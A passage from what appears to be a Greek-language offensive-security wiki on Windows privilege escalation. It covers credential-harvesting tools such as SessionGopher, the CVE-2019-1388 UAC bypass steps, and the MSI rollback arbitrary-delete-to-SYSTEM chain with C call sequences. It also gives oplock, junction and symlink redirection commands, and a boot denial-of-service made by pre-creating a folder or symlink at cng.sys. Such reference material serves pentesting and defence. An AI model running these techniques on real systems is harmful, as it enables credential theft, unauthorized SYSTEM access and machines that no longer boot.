[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που έχω δημιουργήσει για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** στο θύμα.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτή τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρήστη** και **κωδικούς πρόσβασης** για διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά δικαιώματα, αλλά κληρονομώντας όλες τις ανοιχτές handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά δικαιώματα**, μπορείτε να πάρετε την **ανοιχτή handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **εισαγάγετε shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτή την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερες ανοιχτές handles διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που ονομάζονται **pipes**, επιτρέπουν την επικοινωνία μεταξύ διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια λειτουργία που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με τους ρόλους να ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Αν εντοπίσετε μια **προνομιούχα διεργασία** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε, έχετε την ευκαιρία να **αποκτήσετε υψηλότερα δικαιώματα**, υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Οδηγίες για την εκτέλεση μιας τέτοιας επίθεσης θα βρείτε [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και προβολή όλων των pipes για τον εντοπισμό privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει αυθαίρετο DLL ως υπηρεσία. Η πλήρης διαδικασία:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή με δυνατότητα εγγραφής → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει στο συγκεκριμένο handle το `InitContext`, το οποίο ελέγχει ο επιτιθέμενος και έχει οριστεί από το `Initialize`. Καταχωρίστε μια εφαρμογή γραμμής με `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), λάβετε τα συμβάντα μέσω `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, καταργήστε την καταχώριση/τερματίστε τη λειτουργία για να επαναλάβετε τις ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στην ομάδα `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν ενέργειες στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Κλικαρίσιμοι σύνδεσμοι Markdown που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο επιτιθέμενος ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για passwords**

Όταν αποκτήσετε ένα shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη χαμηλών προνομίων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM", ξεκινώντας από έναν μη προνομιούχο χρήστη.

Έτσι, μπορείτε να κλιμακώσετε τα προνόμιά σας και να παρακάμψετε το UAC ταυτόχρονα, αξιοποιώντας την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και έχει εκδοθεί από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να κάνετε exploit σε αυτήν την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Ανάρτηση junctions καταλόγων σε ριζικό κατάλογο που εξυπηρετείται από web server

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο μεταφόρτωσης, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχεται από τον καλούντα και, στη συνέχεια, να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction και να καταλήξει σε έναν κατάλογο που εξυπηρετείται από web server. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα της υπηρεσίας web, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Αυτό αποτελεί όριο αυθαίρετης εγγραφής που εξαρτάται από την εφαρμογή· ένας εγγράψιμος κατάλογος μεταφόρτωσης ή ένα υπάρχον junction από μόνο του δεν αρκεί για να το αποδείξει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στον handler μεταφόρτωσης, τα αποτελεσματικά δικαιώματα του χρήστη για διαγραφή/δημιουργία στον υποκατάλογο, τα αποτελεσματικά ACL του προορισμού, αν το πρόγραμμα εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας του προγράμματος εγγραφής και του web server. Η παθητική καταγραφή μπορεί να δείξει τα ACL των καταλόγων και τα metadata των reparse points, αλλά δεν μπορεί να επιβεβαιώσει τη συμπεριφορά του handler ή μια μελλοντική αντικατάσταση junction. Αν η εκτέλεση καταλήξει σε λογαριασμό υπηρεσίας, ελέγξτε το **πραγματικό token της διεργασίας** πριν εξετάσετε τυχόν ξεχωριστή διαδρομή μέσω προνομίων token.

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με κώδικα exploit [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση βασίζεται στην κατάχρηση της λειτουργίας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για τον σκοπό αυτό, ο επιτιθέμενος πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer**, ο οποίος θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`. Στη συνέχεια, ο Windows Installer θα χρησιμοποιήσει αυτόν τον φάκελο για να αποθηκεύσει αρχεία rollback κατά την απεγκατάσταση άλλων πακέτων MSI, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Εισαγωγή διαδρομής cleanup του Windows Installer COM (CVE-2025-27727)

Ένας client με χαμηλά προνόμια μπορεί να αποκτήσει πρόσβαση στην υπηρεσία SYSTEM `msiexec.exe` μέσω του αντικειμένου COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η αντίστροφη μηχανική εντόπισε τις σχετικές κλήσεις `IMsiServer` ως `MsiBeginTransactionW` στο vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` στο `0xC8` και `CleanupTempPackages` στο `0x50`. Αυτά τα ονόματα και offsets προέκυψαν από αντίστροφη μηχανική και ενδέχεται να διαφέρουν ανά build.<sup>[[41]](#references)</sup>

Για χρήστη που δεν είναι administrator, η `SetEEUIDirectoryAndFilter` κάνει impersonation του καλούντος μόνο κατά το άνοιγμα της παρεχόμενης διαδρομής με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` και `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο καλών μπορεί να διαγράψει τον κατάλογο και αποφεύγει την παρακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο αντικείμενο αρχείου με το μεταγενέστερο cleanup ούτε αποδεικνύει ότι το δημιούργησε ο Windows Installer.<sup>[[41]](#references)</sup>

Μετά την `MsiBeginTransactionW`, η `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από το όρισμα φίλτρου του καλούντος. Η υπηρεσία γράφει μια επώνυμη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο καλών και τα δεδομένα `0x00000002` αποτελούν τη σημαία φακέλου. Έπειτα, η `CleanupTempPackages(NULL, FALSE)` μεταβαίνει απευθείας στο cleanup. Το elevated worker απαριθμεί τις τιμές του registry και περνά τις εγγραφές φακέλων στη recursive `FDeleteFolder`, χωρίς να ελέγχει την προέλευση της διαδρομής. Αν η κανονική αφαίρεση αποτύχει, ο κώδικας καλεί επίσης την `LockdownPath`, εκκαθαρίζει τα file attributes και δοκιμάζει ξανά.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι η επαναχρησιμοποίηση διαδρομής, όχι η ανακατεύθυνση μέσω junction. Καταχωρίστε ένα `C:\Config.Msi` που δημιουργήθηκε από τον attacker, αφαιρέστε το και αφήστε το Windows Installer να δημιουργήσει αργότερα ξανά την ίδια διαδρομή, αυτήν τη φορά με προστατευμένα δεδομένα rollback. Ο καθαρισμός εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο κατάλογο ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο ασφαλείας των `FILE_FLAG_OPEN_REPARSE_POINT` και της μετρίασης εμπιστοσύνης ανακατεύθυνσης, επειδή δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το primitive διαγραφής εντάσσεται στην παρακάτω αλυσίδα rollback: διατηρήστε την ξεχωριστή εγγραφή `Installer\Folders`, διαγράψτε το προστατευμένο `C:\Config.Msi`, δημιουργήστε το ξανά με NULL DACL και διατηρήστε ένα handle με δικαίωμα `WRITE_DAC` ανοιχτό πριν το installer ενισχύσει το DACL. Το ήδη ανοιχτό handle μπορεί να επαναφέρει ένα επιτρεπτικό DACL με το `NtSetSecurityObject`, οπότε το παραγόμενο `.rbs` μπορεί να αντικατασταθεί πριν συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το ζήτημα εμποδίζοντας το `CMsiTransaction::SetEEUIDirectoryAndFilter` να καλεί το `ScheduleFileOrFolderDelete` όταν είναι ενεργοποιημένο το νέο feature gate. Η κλήση COM μπορεί και πάλι να επιστρέφει επιτυχία, αλλά δεν προσθέτει πλέον τη διαδρομή που ελέγχει ο attacker στο `TempPackages`. Εγκαταστήστε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025, αντί να χρησιμοποιείτε την επιτυχή επιστροφή της μεθόδου ως δοκιμή για το αν έχει εφαρμοστεί η ενημέρωση.<sup>[[41]](#references)[[42]](#references)</sup>

Η τεχνική συνοψίζεται ως εξής:

1. **Στάδιο 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκαταστήστε το MSI
    - Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ., `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
    - Ορίστε τον installer ως **"UAC Compliant"**, ώστε να μπορεί να τον εκτελέσει ένας **non-admin user**.
    - Διατηρήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκινήστε την απεγκατάσταση
    - Απεγκαταστήστε το ίδιο `.msi`.
    - Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (αντίγραφα ασφαλείας για rollback).
    - **Ελέγχετε περιοδικά το ανοιχτό file handle** με το `GetFinalPathNameByHandle`, για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
    - Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
        - Σηματοδοτεί πότε έχει γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Βήμα 4: Αποτρέψτε τη διαγραφή του `.rbf`
    - Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή του**.
    - Έπειτα **στείλτε σήμα πίσω**, ώστε να ολοκληρωθεί η απεγκατάσταση.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **δεν αφαιρείται το `C:\Config.Msi`**.

- Βήμα 5: Διαγράψτε χειροκίνητα το `.rbf`
    - Διαγράψτε εσείς (ο attacker) το αρχείο `.rbf` χειροκίνητα.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε την ευπάθεια αυθαίρετης διαγραφής φακέλου σε επίπεδο SYSTEM**, για να διαγράψετε το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των Rollback Scripts με κακόβουλα**

- Βήμα 6: Δημιουργήστε ξανά το `C:\Config.Msi` με αδύναμα ACL
    - Δημιουργήστε ξανά τον φάκελο `C:\Config.Msi`.
    - Ορίστε **αδύναμα DACL** (π.χ., Everyone:F) και **διατηρήστε ένα handle ανοιχτό** με δικαίωμα `WRITE_DAC`.

- Βήμα 7: Εκτελέστε άλλη εγκατάσταση
    - Εγκαταστήστε ξανά το `.msi`, με:
        - `TARGETDIR`: Εγγράψιμη τοποθεσία.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολουθήστε για `.rbs`
    - Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Καταγράψτε το όνομα του αρχείου.

- Βήμα 9: Συγχρονιστείτε πριν από το rollback
    - Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
        - Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Εφαρμόστε ξανά τα αδύναμα ACL
    - Αφού λάβετε το event `created` του `.rbs`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρά ACL** στο `C:\Config.Msi`.
        - Όμως, αφού εξακολουθείτε να έχετε ένα handle με δικαίωμα `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά αδύναμα ACL**.

> Τα ACL **ελέγχονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείτε ακόμη να γράψετε στον φάκελο.

- Βήμα 11: Τοποθετήστε πλαστά `.rbs` και `.rbf`
    - Αντικαταστήστε το αρχείο `.rbs` με ένα **πλαστό rollback script** που λέει στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` σας (κακόβουλο DLL) σε μια **προνομιακή τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθετήστε το πλαστό `.rbf` που περιέχει ένα **κακόβουλο DLL payload επιπέδου SYSTEM**.

- Βήμα 12: Ενεργοποιήστε το rollback
    - Στείλτε σήμα στο event συγχρονισμού, ώστε να συνεχίσει ο installer.
    - Ένα **custom action τύπου 19 (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα η εγκατάσταση** σε ένα γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs` σας.
        - Αντιγράφει το DLL `.rbf` σας στην τοποθεσία-στόχο.
    - Τώρα έχετε το **κακόβουλο DLL σας σε διαδρομή από την οποία φορτώνει αρχεία το SYSTEM**.

- Τελικό βήμα: Εκτελέστε κώδικα ως SYSTEM
    - Εκτελέστε ένα έμπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει το DLL που κάνατε hijack.
    - **Μπουμ**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείων σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σας επιτρέπει μόνο **αυθαίρετη διαγραφή αρχείων**;

Θα μπορούσατε να εκμεταλλευτείτε τα **εσωτερικά του NTFS**: κάθε φάκελος έχει μια κρυφή εναλλακτική ροή δεδομένων με το όνομα:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρόλο που καλείς ένα API διαγραφής *αρχείου*, **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει τη διαγραφή αυθαίρετων αρχείων/φακέλων, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχει ο επιτιθέμενος**;

1. Βήμα 1: Ρύθμισε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια προνομιούχα διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακοπεί το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατροπή του `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει τα metadata του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη κι αν **δεν μπορείτε να γράψετε αρχεία** ή να **ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου driver των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή αντιστοιχεί συνήθως στο kernel-mode driver `cng.sys`.
- Αν **την προδημιουργήσετε ως φάκελο**, τα Windows δεν μπορούν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Εντοπίζουν τον φάκελο, **αδυνατούν να εντοπίσουν τον πραγματικό driver** και **προκαλείται crash ή διακόπτεται η εκκίνηση**.
- **Δεν υπάρχει εναλλακτική λύση** και **δεν είναι δυνατή η ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιούχες διαδρομές αρχείων καταγραφής/αντιγράφων ασφαλείας και OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / DoS εκκίνησης

Όταν μια **προνομιούχα υπηρεσία** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζει από **εγγράψιμη ρύθμιση**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η προνομιούχα εγγραφή να οδηγήσει σε αυθαίρετη αντικατάσταση αρχείων (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Απαιτήσεις**
- Η ρύθμιση που αποθηκεύει τη διαδρομή προορισμού είναι εγγράψιμη από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιούχα λειτουργία που γράφει σε αυτήν τη διαδρομή (αρχείο καταγραφής, εξαγωγή, αναφορά).

**Παράδειγμα αλυσίδας**
1. Διαβάστε τη ρύθμιση για να εντοπίσετε τον προορισμό του προνομιούχου αρχείου καταγραφής, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς δικαιώματα admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
